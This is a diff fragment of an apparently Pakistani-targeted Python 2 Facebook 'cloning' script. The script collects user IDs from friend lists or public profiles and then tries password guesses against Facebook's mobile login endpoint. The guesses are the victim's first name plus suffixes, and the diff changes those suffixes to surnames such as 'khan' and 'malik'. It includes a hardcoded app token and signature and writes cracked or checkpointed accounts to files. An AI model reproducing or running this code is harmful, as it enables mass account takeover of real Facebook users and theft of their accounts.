@@ -246,67 +246,67 @@
		login()
	os.system('clear')
	print logo
	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Public ID..."
	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()
def pilih_super():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mCyberZone\033[1;95m♡──────────•◈•──────────╯♡"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mUnknowncoder\033[1;95m♡──────────•◈•──────────♡"
	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mUnknowncoder\033[1;95m♡──────────•◈•──────────♡"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Unknown
			pass #Dev:unknown_coder
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
@@ -338,7 +338,7 @@ def main(arg):
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							pass3 = a['first_name'] + 'rajpoot'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
@@ -352,7 +352,7 @@ def main(arg):
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									pass4 = b['first_name'] + 'mughal'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
@@ -366,7 +366,7 @@ def main(arg):
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '786'
											pass5 = b['first_name'] + 'malik'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
@@ -380,7 +380,7 @@ def main(arg):
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan1'
													pass6 = b['first_name'] + 'khan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
@@ -396,7 +396,7 @@ def main(arg):
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															pass7 = b['first_name'] + 'afridi'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
